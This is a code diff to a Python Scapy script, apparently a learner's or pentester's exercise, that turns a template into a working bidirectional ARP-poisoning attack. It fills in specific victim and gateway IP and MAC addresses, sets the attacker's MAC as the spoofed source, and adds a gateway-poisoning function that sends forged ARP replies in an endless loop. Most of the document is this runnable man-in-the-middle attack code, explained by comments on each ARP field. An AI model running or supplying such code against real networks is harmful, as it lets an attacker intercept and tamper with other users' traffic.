@@ -2,9 +2,11 @@
 from scapy.all import *
 
 
-default_gateway_ip = ""
-victim_mac = ""
-victim_ip = ""
+default_gateway_ip = "192.168.1.254"
+victim_mac = "3C:0A:F3:5A:CE:43"
+victim_ip = "192.168.1.79"
+gateway_mac = "F8:22:29:26:79:70"
+
 
 def pen_test_poison(victim_ip: str, victim_mac: str, default_gateway_ip: str):
     '''
@@ -20,14 +22,25 @@ def pen_test_poison(victim_ip: str, victim_mac: str, default_gateway_ip: str):
             inter=0.1, count=20) # interval of 0.2 means send one of these packets every 0.2 seconds and loop 1 means forever
 
 
+# my MAC address: 3C-55-76-DE-12-EF
+# 192.168.1.122
+
 
 def poison_victim(victim_ip: str, victim_mac: str, default_gateway_ip: str):
     sendp(Ether(dst=victim_mac) / # build ethernet frame with destination of the victim (the frame also includes the source MAC address by default)
-        ARP(op="is-at", # op is-at means this is a reply so an assertion
-            psrc=default_gateway_ip, # the protocol source IP we claim "is-at" the source MAC address
-            pdst=victim_ip, # protocol destination address, the IP we are talking to
-            hwdst=victim_mac, # hardware MAC destination, the hardware MAC address this ARP packet is intended for at the destination
-            hwsrc=""), # The hardware MAC address source, the MAC address we claim is-at the IP address this is defined by default and doesnt need to be metnioned explicitly
-            inter=0.2, loop=1)
-  
-poison_victim(victim_ip, victim_mac, default_gateway_ip)
+      ARP(op="is-at", # op is-at means this is a reply so an assertion
+          psrc=default_gateway_ip, # the protocol source IP we claim "is-at" the source MAC address
+          pdst=victim_ip, # protocol destination address, the IP we are talking to
+          hwdst=victim_mac, # hardware MAC destination, the hardware MAC address this ARP packet is intended for at the destination
+          hwsrc="3C:55:76:DE:12:EF"), # The hardware MAC address source, the MAC address we claim is-at the IP address this is defined by default and doesnt need to be metnioned explicitly
+          inter=0.2, loop=1)
+
+
+def poison_gateway(gateway_ip, gateway_mac, victim_ip):
+    sendp(Ether(dst=gateway_mac) / 
+      ARP(op="is-at",
+          psrc=victim_ip,
+          pdst=gateway_ip,
+          hwdst=gateway_mac,
+          hwsrc="3C:55:76:DE:12:EF"),
+          inter=0.2, loop=1)
